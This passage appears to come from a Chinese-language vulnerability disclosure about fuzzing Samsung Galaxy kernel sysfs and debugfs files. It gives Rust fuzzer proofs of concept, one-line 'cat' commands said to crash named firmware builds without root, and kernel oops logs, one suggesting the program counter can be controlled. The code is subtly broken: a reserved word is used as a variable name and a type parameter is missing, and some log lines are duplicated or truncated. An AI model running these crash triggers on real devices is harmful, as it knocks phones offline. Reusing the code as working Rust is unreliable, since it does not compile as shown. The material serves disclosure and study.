    fn thrasher() {
        // Buffer to read into
        let mut buf = [0x41u8; 8192];
        let fn = "/sys/kernel/debug/smp2p_test/ut_remote_gpio_inout";
        loop {
            if let Ok(mut fd) = File::open(fn) {
                let _ = fd.read(&mut buf);
            }
        }
    }
    fn main() {
        // Make fuzzing threads
        let mut threads = Vec::new();
        for _ in 0..4 {
            threads.push(std::thread::spawn(move || thrasher()));
        }
        // Wait for all threads to exit
        for thr in threads {
            let _ = thr.join();
        }
    }
**J200H (Galaxy J2) [J200HXXU0AQK2] (August 1, 2017)**
* * *
不要求root权限，可以直接运行该fuzzer
    [c0] Unable to handle kernel paging request at virtual address 62655726
    [c0] pgd = c0004000
    [c0] [62: ee456000
    [c0] PC is at devres_for_each_res+0x68/0xdc
    [c0] LR is at 0x62655722
    [c0] pc : []    lr : []    psr: 000d0093
    sp : ee457d20  ip : 00000000  fp : ee457d54
    [c0] r10: ed859210  r9 : c0c833e4  r8 : ed859338
    [c0] r7 : ee456000
    [c0] PC is at devres_for_each_res+0x68/0xdc
    [c0] LR is at 0x62655722
    [c0] pc : []    lr : []    psr: 000d0093
    [c0] [] (devres_for_each_res+0x68/0xdc) from [] (dev_cache_fw_image+0x4c/0x118)
    [c0] [] (dev_cache_fw_image+0x4c/0x118) from [] (dpm_for_each_dev+0x4c/0x6c)
    [c0] [] (dpm_for_each_dev+0x4c/0x6c) from [] (fw_pm_notify+0xe4/0x100)
    [c0] [] (devres_for_each_res+0x68/0xdc) from [] (dev_cache_fw_image+0x4c/0x118)
    [c0] [] (dev_cache_fw_image+0x4c/0x118) from [] (dpm_for_each_dev+0x4c/0x6c)
    [c0] [] (dpm_for_each_dev+0x4c/0x6c) from [] (fw_pm_notify+0xe4/0x100)
    [c0] [] (pm_notifier_call_chain+0x28/0x3c)
    [c0] [] (pm_notifier_call_chain+0x28/0x3c) from [] (pm_suspend+0x154/0x238)
    [c0] [] (pm_suspend+0x154/0x238) from [] (suspend+0x78/0x1b8)
    [c0] [] (suspend+0x78/0x1b8) from [] (process_one_work+0x160/0x4b8)
    [c0] [] [] (pm_notifier_call_chain+0x28/0x3c)
    [c0] [] (pm_notifier_call_chain+0x28/0x3c) from [] (pm_suspend+0x154/0x238)
    [c0] [] (pm_suspend+0x154/0x238) from [] (suspend+0x78/0x1b8)
    [c0] [] (suspend+0x78/0x1b8) from [] (process_one_work+0x160/0x4b8)
**J500H (Galaxy J5) [J500HXXU2BQI1] (August 1, 2017)**
* * *
    cat /sys/kernel/debug/usb_serial0/readstatus
或者：
    cat /sys/kernel/debug/usb_serial1/readstatus
或者：
    cat /sys/kernel/debug/usb_serial2/readstatus
或者：
    cat /sys/kernel/debug/usb_serial3/readstatus
**J500H (Galaxy J5) [J500HXXU2BQI1] (August 1, 2017)**
* * *
    cat /sys/kernel/debug/mdp/xlog/dump
**J500H (Galaxy J5) [J500HXXU2BQI1] (August 1, 2017)**
* * *
    cat /sys/kernel/debug/rpm_master_stats
    J700H (Galaxy J7) [J700HXXU3BRC2] (August 1, 2017)
不要求root权限，可以直接运行该fuzzer
    Unable to handle kernel paging request at virtual address ff00000107
    pgd = ffffffc03409d000
    [ff00000107] *pgd=0000000000000000
    mms_ts 9-0048: mms_sys_fw_update [START]
    mms_ts 9-0048: mms_fw_update_from_storage [START]
    mms_ts 9-0048: mms_fw_update_from_storage [ERROR] file_open - path[/sdcard/melfas.mfsb]
    mms_ts 9-0048: mms_fw_update_from_storage [ERROR] -3
    mms_ts 9-0048: mms_sys_fw_update [DONE]
    muic-universal:muic_show_uart_sel AP
    usb: enable_show dev->enabled=1
    sm5703-fuelga0000000000000000
    Kernel BUG at ffffffc00034e124 [verbose debug info unavailable]
    Internal error: Oops - BUG: 96000004 [#1] PREEMPT SMP
    exynos-snapshot: item - log_kevents is disabled
    CPU: 4 PID: 9022 Comm: lulandroid Tainted: G        W    3.10.61-8299335 #1
    task: ffffffc01049cc00 ti: ffffffc002824000 task.ti: ffffffc002824000
    PC is at sysfs_open_file+0x4c/0x208
    LR is at sysfs_open_file+0x40/0x208
    pc : [] lr : [] pstate: 60000045
    sp : ffffffc002827b70
**G920F (Exynos Galaxy S6) [G920FXXU5DQBC] (Febuary 1, 2017) 现在已经启用了selinux
:(**
* * *
    sec_debug_store_fault_addr 0xffffff80000fe008
    Unhandled fault: synchronous external abort (0x96000010) at 0xffffff80000fe008
    ------------[ cut here ]------------    Kernel BUG at ffffffc0003b6558 [verbose debug info unavailable]
    Internal error: Oops - BUG: 96000010 [#1] PREEMPT SMP
    exynos-snapshot: core register saved(CPU:0)
    CPUMERRSR: 0000000012100088, L2MERRSR: 00000000111f41b8
    exynos-snapshot: context saved(CPU:0)
    exynos-snapshot: item - log_kevents is disabled
    CPU: 0 PID: 5241 Comm: hookah Tainted: G        W      3.18.14-9519568 #1
    Hardware name: Samsung UNIVERSAL8890 board based on EXYNOS8890 (DT)
    task: ffffffc830513000 ti: ffffffc822378000 task.ti: ffffffc822378000
    PC is at samsung_pin_dbg_show_by_type.isra.8+0x28/0x68
    LR is at samsung_pinconf_dbg_show+0x88/0xb0
    Call trace:
    [] samsung_pin_dbg_show_by_type.isra.8+0x28/0x68
    [] samsung_pinconf_dbg_show+0x84/0xb0
    [] samsung_pinconf_group_dbg_show+0x90/0xb0
    [] pinconf_groups_show+0xb8/0xec
    [] seq_read+0x180/0x3ac
    [] vfs_read+0x90/0x148
    [] SyS_read+0x44/0x84
**G950F (Exynos Galaxy S8) [G950FXXU4CRI5] (September 1, 2018)**
* * *
可以通过在内核中获取PC来引发手机崩溃。可能是竞争条件导致的堆破坏所致。
（这个由PC导致的崩溃可能是通过过去某个旧版repro引发的，具体记不清了，可能是2018年4月左右的某个版本）
    task: ffffffc85f672880 ti: ffffffc8521e4000 task.ti: ffffffc8521e4000
    PC is at jopp_springboard_blr_x2+0x14/0x20
    LR is at seq_read+0x15c/0x3b0
    pc : [] lr : [] pstate: a0000145
    sp : ffffffc8521e7d20
    x29: ffffffc8521e7d30 x28: ffffffc8521e7d90
    x27: ffffffc029a9e640 x26: ffffffc84f10a000
    x25: ffffffc8521e7ec8 x24: 00000072755fa348
    x23: 0000000080000000 x22: 0000007282b8c3bc
    x21: 0000000000000e71 x20: 0000000000000000
    x19: ffffffc029a9e600 x18: 00000000000000a0
    x17: 0000007282b8c3b4 x16: 00000000ff419000
    x15: 000000727dc01b50 x14: 0000000000000000
    x13: 000000000000001f x12: 00000072755fa1a8
    x11: 00000072755fa1fc x10: 0000000000000001
    x9 : ffffffc858cc5364 x8 : 0000000000000000
    x7 : 0000000000000001 x6 : 0000000000000001
    x5 : ffffffc000249f18 x4 : ffffffc000fcace8
    x3 : 0000000000000000 x2 : ffffffc84f10a000
    x1 : ffffffc8521e7d90 x0 : ffffffc029a9e600
    PC: 0xffffffc000c20230:
    0230  128001a1 17fec15d 128001a0 d2800015 17fec46e 128001b4 17fec62b 00000000
    0250  01bc8a68 ffffffc0 d503201f a9bf4bf0 b85fc010 716f9e10 712eb61f 54000040
    0270  deadc0de a8c14bf0 d61f0000 a9bf4bf0 b85fc030 716f9e10 712eb61f 54000040
    0290  deadc0de a8c14bf0 d61f0020 a9bf4bf0 b85fc050 716f9e10 712eb61f 54000040
    02b0  deadc0de a8c14bf0 d61f0040 a9bf4bf0 b85fc070 716f9e10 712eb61f 54000040
    02d0  deadc0de a8c14bf0 d61f0060 a9bf4bf0 b85fc090 716f9e10 712eb61f 54000040
    02f0  deadc0de a8c14bf0 d61f0080 a9bf4bf0 b85fc0b0 716f9e10 712eb61f 54000040
    0310  deadc0de a8c14bf0 d61f00a0 a9bf4bf0 b85fc0d0 716f9e10 712eb61f 54000040
**PoC**
* * *
    extern crate rand;
    use std::fs::File;
    use std::io::Read;
    fn thrasher() {
        // These are the 2 files we want to fuzz
        let random_paths = [
            "/sys/devices/platform/battery/power_supply/battery/mst_switch_test",
            "/sys/devices/platform/battery/power_supply/battery/batt_wireless_firmware_update"
        ];
        // Buffer to read into
        let mut buf = [0x41u8; 8192];
        loop {
            // Pick a random file
            let file = &random_paths[rand::random::() % random_paths.len()];
            // Read a random number of bytes from the file
            if let Ok(mut fd) = File::open(file) {
                let rsz = rand::random::() % (buf.len() + 1);
                let _ = fd.read(&mut buf[..rsz]);
            }
        }
    }
    fn main() {
        // Make fuzzing threads
        let mut threads = Vec::new();
        for _ in 0..4 {
            threads.push(std::thread::spawn(move || thrasher()));
        }
        // Wait for all threads to exit
        for thr in threads {
            let _ = thr.join();
        }
    }